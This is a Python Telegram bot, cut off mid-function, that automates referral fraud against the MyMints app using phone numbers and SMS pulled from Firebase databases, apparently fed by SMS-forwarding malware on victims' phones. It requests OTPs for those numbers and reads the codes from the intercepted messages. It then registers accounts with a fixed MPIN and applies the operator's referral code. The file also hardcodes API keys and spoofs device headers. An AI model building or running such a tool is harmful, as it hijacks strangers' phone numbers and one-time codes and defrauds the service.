#!/usr/bin/env python3
"""
MyMints Telegram Automation Bot
- Retains 100% of original phone scoring, regex, OTP extraction, and MyMints API algorithms.
- Full Telegram Bot Interface with:
  1. Persistent Referral Code (Saved in bot_config.json)
  2. Firebase Manager (supports *.firebaseio.com & *.firebasedatabase.app, single/bulk/.txt upload, dynamic live queue)
  3. Independent Manual Refer (Number check -> Send OTP -> Enter OTP -> MPIN -> Apply Refer)
  4. Manual Start / Stop Controls
  5. Live Status Screen with 2-second Auto-Refreshing Monospace Terminal Logs
  6. Contextual Back/Main Menu buttons on every screen & Three-Line Menu Commands
"""

import os
import re
import sys
import time
import json
import threading
from collections import Counter, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, RLock
import html
import math
from typing import Any, Dict, List, Optional, Tuple

import requests
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

# ─── CONFIGURATION & PERSISTENCE ────────────────────────────
CONFIG_FILE = "bot_config.json"

DEFAULT_CONFIG: Dict[str, Any] = {
    "bot_token": os.environ.get("BOT_TOKEN", ""),
    "admin_id": 8008096152,  # 0 means the first user who sends /start becomes admin, or set your Telegram ID
    "referral_code": "",
    "parallel_workers": 6,
    "otp_timeout": 30,
    "firebases": []  # List of {"url": "...", "key": "..."}
}

config_lock = RLock()


def load_config() -> Dict[str, Any]:
    with config_lock:
        if not os.path.exists(CONFIG_FILE):
            save_config_raw(DEFAULT_CONFIG)
            return dict(DEFAULT_CONFIG)
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                # merge missing keys
                for k, v in DEFAULT_CONFIG.items():
                    if k not in data:
                        data[k] = v
                env_tok = os.environ.get("BOT_TOKEN", "").strip()
                if env_tok:
                    data["bot_token"] = env_tok
                return data
        except Exception as e:
            print(f"[CONFIG LOAD ERROR] {e}")
            return dict(DEFAULT_CONFIG)


def save_config_raw(data: Dict[str, Any]) -> None:
    try:
        temp_file = f"{CONFIG_FILE}.tmp"
        with open(temp_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(temp_file, CONFIG_FILE)
    except Exception as e:
        print(f"[CONFIG SAVE ERROR] {e}")


def save_config(updates: Dict[str, Any]) -> None:
    with config_lock:
        data = load_config()
        data.update(updates)
        save_config_raw(data)


# ─── ORIGINAL ENGINE CONSTANTS & HEADERS ────────────────────
BASE_URL = "https://api.mymints.io"
MIN_OTP_TIMEOUT = 30
MIN_PARALLEL_WORKERS = 4
MAX_NUMBERS_PER_DEVICE = 2

HEADERS = {
    "accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "app-version": "1.5.1",
    "Connection": "Keep-Alive",
    "Content-Type": "application/json",
    "device-name": "OPPO Pad Mini",
    "device-type": "Android",
    "device-version": "OPPO",
    "fcm-token": "PASTE_FULL_FCM_TOKEN_HERE",
    "Host": "api.mymints.io",
    "new-x-api-key": "67359a9b3129b93400d5bfa6e5bfbc8f",
    "software-version": "17",
    "User-Agent": "okhttp/4.12.0",
    "x-api-key": "b3a2f8f7c91e42d0a7dce0a514f67d2e",
}

OTP_KEYWORDS = [
    "mymints",
    "my mints",
    "verification code",
    "otp",
    "code",
    "verify",
    "pin",
    "passcode",
]
OTP_SENDERS = ["mymints", "mymnts"]

# HTML-aligned scored SMS number regexes (Exact from original file)
RE_L1 = [
    re.compile(
        r"(?:your|aapka|aap\s*ka|आपका|आपके|aapke)\s*(?:jio|airtel|vi|vodafone|idea|bsnl|mobile|sim|phone|whatsapp|account|a\/c|ac)?\s*(?:number|no\.?|नंबर|मोबाइल|फ़ोन)?\s*(?:is|hai|है|:|=|\s)\s*([6-9]\d{9})\b",
        re.IGNORECASE,
    ),
    re.compile(
        r"\b([6-9]\d{9})\b\s*(?:is|hai|है)\s*(?:your|aapka|aap\s*ka|आपका|registered|linked|saved|updated)\s*(?:jio|airtel|vi|bsnl|mobile|sim|phone|whatsapp|number|no\.?|नंबर)",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:registered|linked|saved|updated|new|active|primary)\s*(?:mobile|number|no\.?|नंबर|sim|phone|whatsapp)\s*(?:number|no\.?)?\s*(?:is|hai|है|:|=|\s)\s*([6-9]\d{9})",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:your\s+)?(?:jio|airtel|vi|vodafone|idea|bsnl)\s*(?:number|no\.?|नंबर|mobile|sim|phone)\s*(?:is|hai|है|:|=|\s)\s*([6-9]\d{9})",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:this\s+is|यह)\s*(?:your|aapka|aap\s*ka)\s*(?:new\s*)?(?:jio|airtel|vi|bsnl|mobile|sim|phone|whatsapp)?\s*(?:number|no\.?|नंबर)?\s*[:=]?\s*([6-9]\d{9})",
        re.IGNORECASE,
    ),
]
RE_L2 = [
    re.compile(
        r"(?:a\/c|account|ac|sim|number|नंबर)\s*(?:number|no\.?|नंबर)?\s*(?:is|hai|है|:|=)\s*([6-9]\d{9})",
        re.IGNORECASE,
    ),
    re.compile(
        r"([6-9]\d{9})\s*(?:par|pe|पर|पे)\s*(?:recharge|plan|pack|activated|activate|offer|किया|करें)",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:recharge|plan|pack|activated|activate|offer|किया|करें)\s*(?:on|par|pe|पर|पे)?\s*([6-9]\d{9})",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:successfully\s+)?(?:recharged|activated|linked|added|updated)\s*([6-9]\d{9})",
        re.IGNORECASE,
    ),
    re.compile(
        r"([6-9]\d{9})\s*(?:successfully\s+)?(?:recharged|activated|linked|added|updated)",
        re.IGNORECASE,
    ),
    re.compile(r"(?:send|sent|transfer|transferred)\s*(?:to|from)\s*([6-9]\d{9})", re.IGNORECASE),
    re.compile(r"(?:call|missed|received)\s*(?:from|to|on)?\s*([6-9]\d{9})", re.IGNORECASE),
]
RE_L3 = [
    re.compile(
        r"(?:number|no\.?|नंबर|mobile|sim|phone|whatsapp|a\/c|account|jio|airtel|vi|bsnl|वोडाफोन|एयरटेल)\s+([6-9]\d{9})",
        re.IGNORECASE,
    ),
    re.compile(
        r"([6-9]\d{9})\s+(?:number|no\.?|नंबर|mobile|sim|phone|whatsapp|a\/c|account|jio|airtel|vi|bsnl)",
        re.IGNORECASE,
    ),
    re.compile(r"([6-9]\d{9})\s*(?:ka|ke|ki|का|के|की|को|से|par|pe|पर|पे)", re.IGNORECASE),
]
RE_MULTI = re.compile(r"([6-9]\d{9})\s*(?:&|,|and|aur|और|\/)\s*([6-9]\d{9})", re.IGNORECASE)
RE_ALL10 = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
RE_AMOUNT = re.compile(
    r"(?:rs\.?|₹|inr|rupees|रुपये|amount|amt|cost|price|balance|deducted|credited|debited|paid|payment|txn|transaction|order|invoice|bill|total|subtotal|points|score|reward)",
    re.IGNORECASE,
)
RE_OTP_CTX = re.compile(
    r"(?:otp|code|verification|verify|pin|password|passcode|शपथ|cvv|secret|token)",
    re.IGNORECASE,
)
RE_DATE_CTX = re.compile(
    r"(?:\bdate\b|\btime\b|\byear\b|\bmonth\b|\bday\b|\bjan\b|\bfeb\b|\bmar\b|\bapr\b|\bmay\b|\bjun\b|\bjul\b|\baug\b|\bsep\b|\boct\b|\bnov\b|\bdec\b|\d{2}[-\/]\d{2}[-\/]\d{2,4}|\d{1,2}:\d{2})",
    re.IGNORECASE,
)
RE_STRONG = re.compile(
    r"(?:number|no\.?|नंबर|mobile|sim|phone|whatsapp|a\/c|account|jio|airtel|vi|bsnl|registered|linked|saved|updated)",
    re.IGNORECASE,
)

# Regex matching BOTH firebaseio.com and firebasedatabase.app
FB_URL_REGEX = re.compile(
    r"(https?://[a-zA-Z0-9_\-\.]+(?:firebaseio\.com|firebasedatabase\.app)[^\s|\'\"]*)",
    re.IGNORECASE,
)

# ─── REAL-TIME LOGGING & STATS ENGINE ───────────────────────
_fb_sess = requests.Session()
from requests.adapters import HTTPAdapter
_adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
_fb_sess.mount("https://", _adapter)
_fb_sess.mount("http://", _adapter)
_print_lock = Lock()
_stats_lock = Lock()
_log_lock = Lock()

stats = {"success": 0, "skip": 0, "fail": 0}
auto_scan_log_buffer = deque(maxlen=50)


def terminal_log(msg: str) -> None:
    """Prints system, bot commands, and administrative events to terminal only."""
    timestamp = time.strftime("%H:%M:%S")
    formatted = f"[{timestamp}] {msg}"
    with _print_lock:
        print(formatted, flush=True)


def auto_scan_log(msg: str) -> None:
    """Prints auto-refer scanning & OTP execution logs to terminal AND buffers for Telegram Live Status."""
    timestamp = time.strftime("%H:%M:%S")
    formatted = f"[{timestamp}] {msg}"
    with _print_lock:
        print(formatted, flush=True)
    with _log_lock:
        auto_scan_log_buffer.append(formatted)


def get_last_auto_scan_logs(count: int = 5) -> str:
    with _log_lock:
        lines = list(auto_scan_log_buffer)[-count:]
    if not lines:
        return "[Waiting for auto-scan to run... Click ▶️ Start Refer]"
    return "\n".join(lines)


def add_stat(key: str) -> None:
    with _stats_lock:
        stats[key] = stats.get(key, 0) + 1


def get_stats_copy() -> Dict[str, int]:
    with _stats_lock:
        return dict(stats)


def reset_stats() -> None:
    with _stats_lock:
        stats["success"] = 0
        stats["skip"] = 0
        stats["fail"] = 0


# ─── CORE PARSER & ONLINE DETECTION HELPERS ─────────────────
def is_valid_indian_num(num: Optional[str]) -> bool:
    return bool(num and len(num) == 10 and num.isdigit() and num[0] in "6789")


def _clean_num(raw: Any) -> Optional[str]:
    if raw is None:
        return None
    s = re.sub(r"\D", "", str(raw).strip())
    if not s:
        return None
    if len(s) == 10 and is_valid_indian_num(s):
        return s
    if len(s) == 12 and s.startswith("91") and is_valid_indian_num(s[2:]):
        return s[2:]
    if len(s) == 11 and s.startswith("0") and is_valid_indian_num(s[1:]):
        return s[1:]
    return None


def _is_online(info: Dict[str, Any]) -> bool:
    for fld in ("status", "online", "isOnline", "state", "connection_status"):
        st = info.get(fld)
        if st is True:
            return True
        if isinstance(st, str) and st.strip().lower() in ("true", "online", "1", "active", "connected"):
            return True
        if isinstance(st, (int, float)) and st == 1:
            return True
    return False


def _fb_get(url: str, key: str = "", params: Optional[Dict[str, Any]] = None) -> Any:
    q = dict(params or {})
    if key:
        q["auth"] = key
    try:
        r = _fb_sess.get(url, params=q, timeout=10)
        if r.status_code == 200 and r.text not in ("null", "", "false"):
            return r.json()
    except Exception:
        pass
    return None


def extract_numbers_with_score(msg: str) -> List[Tuple[str, int]]:
    if not msg:
        return []
    text = str(msg)
    scores: Dict[str, int] = defaultdict(int)

    def push_num(raw_n: Optional[str], pts: int) -> None:
        n = _clean_num(raw_n)
        if n and is_valid_indian_num(n):
            scores[n] += pts

    for pat in RE_L1:
        for m in pat.finditer(text):
            push_num(m.group(1), 12)

    for pat in RE_L2:
        for m in pat.finditer(text):
            push_num(m.group(1), 8)

    for pat in RE_L3:
        for m in pat.finditer(text):
            push_num(m.group(1), 5)

    seen_10 = set()
    for m in RE_ALL10.finditer(text):
        n = m.group(1)
        if n in seen_10 or not is_valid_indian_num(n):
            continue
        seen_10.add(n)
        s_idx, e_idx = m.span()
        ctx = (
            text[max(0, s_idx - 70) : s_idx] + " " + text[e_idx : min(len(text), e_idx + 80)]
        ).lower()
        if not RE_STRONG.search(ctx):
            if RE_AMOUNT.search(ctx) or RE_OTP_CTX.search(ctx) or RE_DATE_CTX.search(ctx):
                continue
        scores[n] += 2

    for m in RE_MULTI.finditer(text):
        push_num(m.group(1), 7)
        push_num(m.group(2), 7)

    return list(scores.items())


def _sort_sms_items(items: List[Tuple[str, Any]]) -> List[Tuple[str, Any]]:
    def _key_func(kv: Tuple[str, Any]):
        k, v = kv
        if isinstance(v, dict):
            ts = v.get("timestamp") or v.get("ts") or v.get("date") or v.get("time")
            if ts is not None:
                d = re.sub(r"\D", "", str(ts))
                if len(d) >= 10:
                    return (2, int(d[:13].ljust(13, "0")))
            mid = v.get("id")
            if mid is not None:
                d = re.sub(r"\D", "", str(mid))
                if d:
                    return (1, int(d))
        if str(k).isdigit():
            return (1, int(k))
        return (0, str(k))
    return sorted(items, key=_key_func, reverse=True)


def _parse_sms_records(data: Any) -> List[str]:
    bodies: List[str] = []
    if not data:
        return bodies
    items = (
        [(str(i), v) for i, v in enumerate(data)]
        if isinstance(data, list)
        else list(data.items()) if isinstance(data, dict) else []
    )
    sorted_items = _sort_sms_items(items)
    for _, v in sorted_items[:60]:
        if isinstance(v, str):
            bodies.append(v)
        elif isinstance(v, dict):
            b = (
                v.get("message")
                or v.get("body")
                or v.get("text")
                or v.get("msg")
                or v.get("sms")
                or v.get("messageText")
                or ""
            )
            if b:
                bodies.append(str(b))
    return bodies


def _extract_record_numbers(dev_id: str, info: Dict[str, Any]) -> List[str]:
    nums: List[str] = []
    seen = set()

    def add_val(val: Any) -> None:
        n = _clean_num(val)
        if n and n not in seen:
            seen.add(n)
            nums.append(n)

    add_val(info.get("mobNo"))

    sims = info.get("sims")
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                add_val(s.get("phoneNumber") or s.get("phone") or s.get("number"))
            elif isinstance(s, (str, int)):
                add_val(s)
    elif isinstance(sims, dict):
        for s in sims.values():
            if isinstance(s, dict):
                add_val(s.get("phoneNumber") or s.get("phone") or s.get("number"))
            elif isinstance(s, (str, int)):
                add_val(s)

    for fld in (
        "phoneNumber",
        "number",
        "mobile",
        "phone",
        "mobileNumber",
        "Mobile",
        "Number",
        "contact",
        "num",
        "Phone #1",
        "sim1",
        "msisdn",
    ):
        if len(nums) >= MAX_NUMBERS_PER_DEVICE:
            break
        add_val(info.get(fld))

    add_val(dev_id)
    return nums[:MAX_NUMBERS_PER_DEVICE]


def _extract_sms_numbers(bodies: List[str], existing: List[str]) -> List[str]:
    seen = set(existing)
    if len(seen) >= MAX_NUMBERS_PER_DEVICE or not bodies:
        return list(existing)[:MAX_NUMBERS_PER_DEVICE]

    scores: Counter = Counter()
    for idx, body in enumerate(bodies):
        recency = (5 - idx) * 2 if idx < 5 else 0
        for num, sc in extract_numbers_with_score(body):
            if num not in seen:
                scores[num] += sc + recency

    out = list(existing)
    for num, _ in scores.most_common():
        if num not in seen:
            seen.add(num)
            out.append(num)
        if len(out) >= MAX_NUMBERS_PER_DEVICE:
            break
    return out[:MAX_NUMBERS_PER_DEVICE]


def get_online_devices_with_numbers(fb_url: str, fb_key: str = "", workers: int = 6) -> List[Dict[str, str]]:
    base = fb_url.rstrip("/")
    clients = _fb_get(f"{base}/clients.json", key=fb_key)
    if not clients:
        clients = _fb_get(f"{base}/devices.json", key=fb_key)
    if not clients:
        clients = _fb_get(f"{base}/All_Users.json", key=fb_key)
    if not clients:
        clients = _fb_get(f"{base}/all_users.json", key=fb_key)
    if not clients:
        clients = _fb_get(f"{base}/users.json", key=fb_key)
    if not clients:
        clients = _fb_get(f"{base}/Users.json", key=fb_key)

    if isinstance(clients, list):
        clients = {str(i): v for i, v in enumerate(clients) if isinstance(v, dict)}
    elif not isinstance(clients, dict):
        return []

    online_items: List[Tuple[str, Dict[str, Any]]] = []
    for dev_id, info in clients.items():
        if isinstance(info, dict) and _is_online(info):
            online_items.append((str(dev_id), info))

    num_to_devs: Dict[str, List[str]] = defaultdict(list)
    dev_nums: Dict[str, List[str]] = {}
    for dev_id, info in online_items:
        n_list = _extract_record_numbers(dev_id, info)
        dev_nums[dev_id] = n_list
        for n in n_list:
            num_to_devs[n].append(dev_id)

    for dup_num, ids in num_to_devs.items():
        if len(ids) > 1:
            for did in ids:
                dev_nums[did] = [x for x in dev_nums[did] if x != dup_num]

    def _enrich_one(item: Tuple[str, Dict[str, Any]]) -> Optional[Dict[str, str]]:
        dev_id, _ = item
        nums = list(dev_nums.get(dev_id, []))
        if len(nums) < MAX_NUMBERS_PER_DEVICE:
            sms_raw = _fb_get(f"{base}/messages/{dev_id}.json", key=fb_key)
            bodies = _parse_sms_records(sms_raw)
            nums = _extract_sms_numbers(bodies, nums)
        if nums:
            return {
                "mobile": nums[0],
                "numbers": nums,
                "device_id": dev_id,
                "fb_url": base,
                "fb_key": fb_key,
            }
        return None

    results: List[Dict[str, str]] = []
    with ThreadPoolExecutor(max_workers=max(MIN_PARALLEL_WORKERS, workers)) as ex:
        futs = [ex.submit(_enrich_one, it) for it in online_items]
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                results.append(res)

    return results


# ─── OTP EXTRACTION & POLLING ───────────────────────────────
def is_otp_sms(sender: str, body: str) -> bool:
    s = (sender or "").lower()
    b = (body or "").lower()
    if any(kw in s for kw in OTP_SENDERS):
        return True
    if any(kw in b for kw in OTP_KEYWORDS):
        return True
    return bool(re.search(r"(?<!\d)\d{6}(?!\d)", b))


def extract_otp(body: Optional[str]) -> Optional[str]:
    if not body:
        return None
    # 1. OTP near prefix keywords: e.g. "OTP is 123456", "code: 123456"
    m = re.search(
        r"(?:otp|code(?:\s+for\s+\w+)?|verification|verify|pin|passcode)\s*(?:is|:|-)?\s*(?<!\d)(\d{6})(?!\d)",
        body,
        re.IGNORECASE,
    )
    if m:
        return m.group(1)
    # 2. OTP before suffix keywords: e.g. "123456 is your otp/code"
    m = re.search(
        r"(?<!\d)(\d{6})(?!\d)\s*(?:is\s+(?:your\s+)?)?(?:otp|code|pin|verification|passcode)",
        body,
        re.IGNORECASE,
    )
    if m:
        return m.group(1)
    # 3. Any standalone exactly 6-digit number
    m = re.search(r"(?<!\d)(\d{6})(?!\d)", body)
    return m.group(1) if m else None
def fb_poll_otp(
    fb_url: str,
    fb_key: str,
    mobile: str,
    device_id: str,
    after_ts_ms: int,
    timeout: int = 30,
) -> Optional[str]:
    effective_timeout = max(MIN_OTP_TIMEOUT, int(timeout))
    base = fb_url.rstrip("/")
    num91 = "91" + mobile
    start = time.monotonic()

    paths = list(
        dict.fromkeys([
            f"messages/{device_id}",
            f"messages/{num91}",
            f"messages/{mobile}",
            f"forwardSms/{device_id}",
            f"smsForward/{device_id}",
            f"sms_forward/{device_id}",
            f"otps/{device_id}",
            f"otps/{num91}",
            f"profex_incoming/{device_id}",
            f"clients/{device_id}/messages",
            f"clients/{device_id}/sms",
            f"All_Users/{device_id}",
            f"All_User/{device_id}",
            device_id,
            num91,
            mobile,
        ])
    )

    while time.monotonic() - start < effective_timeout:
        if engine.stop_requested:
            break

        for path in paths:
            if engine.stop_requested:
                break
            data = _fb_get(f"{base}/{path}.json", key=fb_key)
            if not data:
                continue

            if isinstance(data, list):
                raw_items = [(str(i), v) for i, v in enumerate(data) if isinstance(v, dict)]
            elif isinstance(data, dict):
                raw_items = [(str(k), v) for k, v in data.items() if isinstance(v, dict)]
            else:
                continue

            if not raw_items:
                continue

            sorted_items = _sort_sms_items(raw_items)

            for k_str, item in sorted_items[:20]:
                sender = str(
                    item.get("sender")
                    or item.get("from")
                    or item.get("address")
                    or item.get("SenderName")
                    or item.get("number")
                    or ""
                )
                body = str(
                    item.get("message")
                    or item.get("body")
                    or item.get("text")
                    or item.get("sms")
                    or item.get("messageText")
                    or item.get("msg")
                    or ""
                )
                if not body.strip():
                    continue

                actual_ts = item.get("timestamp") or item.get("ts") or item.get("date") or item.get("time")
                if actual_ts is not None:
                    try:
                        digits = re.sub(r"\D", "", str(actual_ts))
                        if len(digits) >= 10:
                            if len(digits) == 10:
                                ts_ms = int(digits) * 1000
                            else:
                                ts_ms = int(digits[:13].ljust(13, "0"))
                            if ts_ms < (after_ts_ms - 120_000):
                                continue
                    except Exception:
                        pass

                if is_otp_sms(sender, body):
                    otp = extract_otp(body)
                    if otp:
                        return otp

        time.sleep(1.2)

    return None


# ─── MYMINTS API ENDPOINTS ──────────────────────────────────
def _post_json(path: str, payload: Dict[str, Any], extra_headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    hdrs = {**HEADERS, **(extra_headers or {})}
    try:
        r = requests.post(f"{BASE_URL}{path}", json=payload, headers=hdrs, timeout=15)
        return r.json()
    except Exception as e:
        return {"success": False, "error": str(e)}


def validate_referral(code: str) -> bool:
    if not code:
        return False
    d = _post_json("/api/v1/users/validate/referral", {"code": code.strip().upper()})
    ok = bool(d.get("success") and (d.get("data") or {}).get("exists"))
    terminal_log(f"[VALIDATE] {'✓' if ok else '✗'} ({code})")
    return ok


def send_otp_api(phone: str) -> Tuple[bool, Dict[str, Any]]:
    d = _post_json("/api/v1/otp/mobile", {"mobile": phone, "phone_code": "+91"})
    ok = bool(d.get("success", False))
    auto_scan_log(f"[OTP SEND] {'✓' if ok else '✗'} → {phone}")
    return ok, d


def verify_otp_api(phone: str, otp: str) -> Tuple[Optional[str], Optional[str], bool]:
    d = _post_json("/api/v1/otp/mobile/verify", {"mobile": phone, "otp": otp})
    if not d.get("success"):
        auto_scan_log(f"[VERIFY] ✗ {phone} | {d}")
        return None, None, False
    data = d.get("data") or {}
    is_new = "mpin_setup_token" in data
    return data.get("token"), data.get("mpin_setup_token"), is_new


def set_mpin_api(mpin_token: str) -> Optional[str]:
    d = _post_json(
        "/api/v1/auth/mpin",
        {"mpin": "1234"},
        extra_headers={"authorization": f"Bearer {mpin_token}"},
    )
    ok = bool(d.get("success", False))
    auto_scan_log(f"[MPIN] {'✓' if ok else '✗'}")
    if ok:
        data = d.get("data") or {}
        return data.get("token")
    return None


def apply_referral_api(token: str, code: str) -> str:
    d = _post_json(
        "/api/v1/users/apply-referral-code",
        {"code": code},
        extra_headers={"authorization": f"Bearer {token}"},
    )
    if d.get("success"):
        info = d.get("data") or {}
        auto_scan_log(f"[REFERRAL] ✓ ref={info.get('referral_code')} id={info.get('referrer_id')}")
        return "success"
    msg = str(((d.get("data") or {}).get("message") or "")).lower()
    if "already" in msg:
        auto_scan_log("[REFERRAL] ⚠ Already applied")
        return "already"
    auto_scan_log(f"[REFERRAL] ✗ {d}")
    return "failed"


def process_online_target(target: Dict[str, str], ref_code: str, otp_timeout: int) -> None:
    mobile = target["mobile"]
    device_id = target["device_id"]
    fb_url = target["fb_url"]
    fb_key = target["fb_key"]

    auto_scan_log(f"[START] {mobile} | dev={device_id[:14]}")
    ok, _ = send_otp_api(mobile)
    if not ok:
        add_stat("fail")
        return

    after_ts_ms = int(time.time() * 1000)
    otp = fb_poll_otp(fb_url, fb_key, mobile, device_id, after_ts_ms, timeout=otp_timeout)
    if not otp:
        auto_scan_log(f"[TIMEOUT] No OTP in {otp_timeout}s → {mobile}")
        add_stat("fail")
        return

    auto_scan_log(f"[OTP READ] ✓ {otp} → {mobile}")
    if engine.stop_requested:
        return

    token, mpin_token, is_new = verify_otp_api(mobile, otp)
    if not token and not mpin_token:
        add_stat("fail")
        return

    if not is_new:
        auto_scan_log(f"[SKIP] Old account → {mobile}")
        add_stat("skip")
        return

    if mpin_token:
        new_tok = set_mpin_api(mpin_token)
        if new_tok:
            token = new_tok
        time.sleep(0.3)

    if not token:
        auto_scan_log(f"[FAIL] Auth token nahi mila → {mobile}")
        add_stat("fail")
        return

    if engine.stop_requested:
        return

    res = apply_referral_api(token, ref_code)
    if res == "success":
        add_stat("success")
        auto_scan_log(f"[DONE] ✓ {mobile}")
    elif res == "already":
        add_stat("skip")
    else:
        add_stat("fail")


# ─── BACKGROUND AUTO-REFER CONTROLLER (DYNAMIC QUEUE) ────────
class AutoReferController:
    def __init__(self):
        self.is_running = False
        self.stop_requested = False
        self.thread: Optional[threading.Thread] = None
        self.lock = Lock()
        self.pending_fbs: List[Dict[str, str]] = []
        self.processed_urls = set()
        self.active_targets_count = 0
        self.current_fb_info = ""

    def start(self, initial_fbs: List[Dict[str, str]], ref_code: str, workers: int, otp_timeout: int) -> Tuple[bool, str]:
        with self.lock:
            if self.is_running:
                return False, "Auto-refer pehle se chal raha hai!"
            if not ref_code:
                return False, "Referral code set nahi hai!"
            if not initial_fbs:
                return False, "Kam se kam 1 Firebase add hona zaroori hai!"

            self.is_running = True
            self.stop_requested = False
            self.pending_fbs = list(initial_fbs)
            self.processed_urls = set()
            self.active_targets_count = 0
            self.current_fb_info = ""
            reset_stats()

            self.thread = threading.Thread(
                target=self._run_loop,
                args=(ref_code, workers, otp_timeout),
                daemon=True,
            )
            self.thread.start()
            auto_scan_log(f"[BOT] Auto-refer background engine started with {len(initial_fbs)} Firebases.")
            return True, "Auto Refer Safalta-purvak Shuru Ho Gaya Hai!"

    def add_more_fbs_to_queue(self, new_fbs: List[Dict[str, str]]) -> int:
        with self.lock:
            added = 0
            existing_urls = {fb["url"] for fb in self.pending_fbs}.union(self.processed_urls)
            for fb in new_fbs:
                if fb["url"] not in existing_urls:
                    self.pending_fbs.append(fb)
                    existing_urls.add(fb["url"])
                    added += 1
            if added > 0:
                auto_scan_log(f"[DYNAMIC QUEUE] +{added} naye Firebase live running queue me jud gaye!")
            return added

    def stop(self) -> None:
        with self.lock:
            self.stop_requested = True
            self.is_running = False
        auto_scan_log("[STOP] Stop command receive hua. Auto-refer halt ho raha hai...")

    def _run_loop(self, ref_code: str, workers: int, otp_timeout: int) -> None:
        auto_scan_log("=" * 45)
        auto_scan_log(f"[START] Pipeline Active | Workers: {workers} | Poll: {otp_timeout}s")
        auto_scan_log("=" * 45)

        seen_mobiles = set()

        while not self.stop_requested:
            current_fb = None
            with self.lock:
                if self.pending_fbs:
                    current_fb = self.pending_fbs.pop(0)
                    self.processed_urls.add(current_fb["url"])

            if not current_fb:
                # No more Firebases currently in queue
                break

            url = current_fb["url"]
            key = current_fb.get("key", "")
            self.current_fb_info = url

            auto_scan_log(f"[SCAN] FB Scan: {url[:30]}...")
            online_devs = get_online_devices_with_numbers(url, key, workers=workers)
            auto_scan_log(f"[SCAN] Found {len(online_devs)} online devices: {url[:25]}...")

            targets = []
            for item in online_devs:
                mob = item["mobile"]
                if mob not in seen_mobiles:
                    seen_mobiles.add(mob)
                    targets.append(item)

            if not targets:
                continue

            self.active_targets_count += len(targets)
            auto_scan_log(f"[QUEUE] +{len(targets)} targets queue kiye gaye...")

            with ThreadPoolExecutor(max_workers=workers) as pool:
                futures = [
                    pool.submit(process_online_target, t, ref_code, otp_timeout)
                    for t in targets
                ]
                for fut in as_completed(futures):
                    if self.stop_requested:
                        auto_scan_log("[CANCEL] Remaining workers cancel ho gaye.")
                        for f in futures:
                            f.cancel()
                        pool.shutdown(wait=False, cancel_futures=True)
                        break
                    try:
                        fut.result()
                    except Exception as e:
                        auto_scan_log(f"[ERR] Worker error: {e}")

        with self.lock:
            self.is_running = False
            self.current_fb_info = ""

        st = get_stats_copy()
        auto_scan_log(f"[DONE] Batch complete! ✓{st['success']} ⚠{st['skip']} ✗{st['fail']}")


engine = AutoReferController()

# ─── TELEGRAM BOT INITIALIZATION ────────────────────────────
cfg = load_config()
init_token = cfg.get("bot_token", "").strip()
if not init_token or ":" not in init_token:
    init_token = "123456:placeholder_token_for_handlers_registration"
bot = telebot.TeleBot(init_token, parse_mode="HTML")

# In-memory user states for manual inputs
user_states: Dict[int, Dict[str, Any]] = {}
live_watchers: Dict[int, int] = {}  # chat_id -> message_id


def is_admin(user_id: int) -> bool:
    c = load_config()
    admin_id = c.get("admin_id", 0)
    try:
        admin_id = int(admin_id)
    except Exception:
        admin_id = 0
    if admin_id == 0:
        # First user becomes admin
        save_config({"admin_id": user_id})
        terminal_log(f"[BOT] First user detected! Admin permanently set to Telegram ID: {user_id}")
        return True
    return int(user_id) == admin_id


# ─── KEYBOARDS (WITH CONTEXTUAL BACK & MAIN MENU) ────────────
def get_main_menu_markup() -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup(row_width=2)
    c = load_config()
    ref = c.get("referral_code") or "NOT SET ❌"
    fb_count = len(c.get("firebases", []))
    status_icon = "🟢 RUNNING" if engine.is_running else "🔴 IDLE"

    btn_status = types.InlineKeyboardButton(f"📊 Live Status ({status_icon})", callback_data="btn_live_status")
    btn_start = types.InlineKeyboardButton("▶️ Start Refer", callback_data="btn_start_refer")
    btn_stop = types.InlineKeyboardButton("⏹️ Stop Refer", callback_data="btn_stop_refer")
    btn_manual = types.InlineKeyboardButton("📱 Manual Refer (1-by-1)", callback_data="btn_manual_refer")
    btn_add_fb = types.InlineKeyboardButton(f"➕ Add Firebase ({fb_count})", callback_data="btn_add_fb")
    btn_manage_fb = types.InlineKeyboardButton("📁 Manage Firebases", callback_data="btn_manage_fb")
    btn_set_ref = types.InlineKeyboardButton(f"⚙️ Refer Code: {ref}", callback_data="btn_set_ref")
    btn_workers = types.InlineKeyboardButton(f"⚡ Workers: {c.get('parallel_workers', 6)}", callback_data="btn_settings")

    markup.add(btn_status)
    markup.row(btn_start, btn_stop)
    markup.add(btn_manual)
    markup.row(btn_add_fb, btn_manage_fb)
    markup.row(btn_set_ref, btn_workers)
    return markup


def get_back_markup(target: str = "main_menu") -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data=f"goto_{target}"))
    return markup


def get_status_markup() -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_refresh = types.InlineKeyboardButton("🔄 Refresh Now", callback_data="btn_refresh_status")
    btn_stop_auto = types.InlineKeyboardButton("⏹️ Stop Refer", callback_data="btn_stop_refer")
    btn_start_auto = types.InlineKeyboardButton("▶️ Start Refer", callback_data="btn_start_refer")
    btn_back = types.InlineKeyboardButton("🏠 Main Menu", callback_data="goto_main_menu")
    if engine.is_running:
        markup.row(btn_refresh, btn_stop_auto)
    else:
        markup.row(btn_refresh, btn_start_auto)
    markup.add(btn_back)
    return markup


# ─── FIREBASE EXTRACTOR UTILITY ─────────────────────────────
def extract_firebases_from_text(raw_text: str) -> List[Dict[str, str]]:
    results = []
    lines = raw_text.splitlines()

    for line in lines:
